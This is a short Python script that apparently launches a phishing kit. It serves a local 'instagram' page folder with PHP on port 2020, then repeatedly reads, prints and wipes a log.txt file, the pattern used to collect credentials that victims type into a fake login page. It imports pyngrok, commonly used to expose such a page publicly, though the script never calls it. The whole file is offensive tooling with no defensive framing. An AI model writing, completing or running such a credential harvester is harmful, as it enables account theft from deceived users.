from pyngrok import ngrok
import os , sys , subprocess
from colorama import Fore , init
init()
import json

def server():
        os.chdir('instagram')
        with open('php.log' , 'w') as file:
            subprocess.Popen(('php' , '-S' , 'localhost:2020'),stderr=file , stdout=file)
            print(Fore.GREEN+'''
            RUN SERVER PORT 2020 
            your privit link : http://localhost:2020
            ''')
            print('\n')

stat_file_logs1 = 0
def hacker():
    global stat_file_logs1
    try:
        if not str(os.stat("log.txt").st_size) == stat_file_logs1:
            stat_file_logs1 = str(os.stat("log.txt").st_size)
            file_ip = open("log.txt", 'r')
            i = file_ip.readlines()
            try:
                i = i[-1]
                i = i.strip()
                file = open('log.txt', 'r').read()
                print(Fore.BLUE+file)
                o = open("log.txt", "w")
                o.write("")
                o.close()
            except:
                print('')

    except :
        pass
server()
while True:
    hacker()
